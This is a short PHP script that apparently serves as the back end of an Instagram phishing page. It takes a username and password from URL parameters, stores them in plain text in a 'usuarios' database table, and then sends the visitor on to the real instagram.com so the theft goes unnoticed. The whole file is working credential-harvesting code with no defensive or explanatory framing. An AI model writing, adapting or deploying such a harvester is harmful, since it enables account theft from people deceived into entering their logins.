<?php

$usuario=$_GET["usuario"];
$contraseña=$_GET["contraseña"];

include "conexion.php";



try {

    $conn = new PDO("mysql:host=".$host.";dbname=".$dbName.";charset=utf8mb4",$username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $query = "INSERT INTO usuarios (usuario, contraseña) VALUES (?, ?)";
    $stmt = $conn->prepare($query);
    $stmt->bindParam(1, $usuario);
    $stmt->bindParam(2, $contraseña);   

    $stmt->execute();

    header("Location: https://instagram.com");
    
} catch (PDOException $e) {
    // En caso de error, mostrar el mensaje de error
    header("Location: https://instagram.com");
}

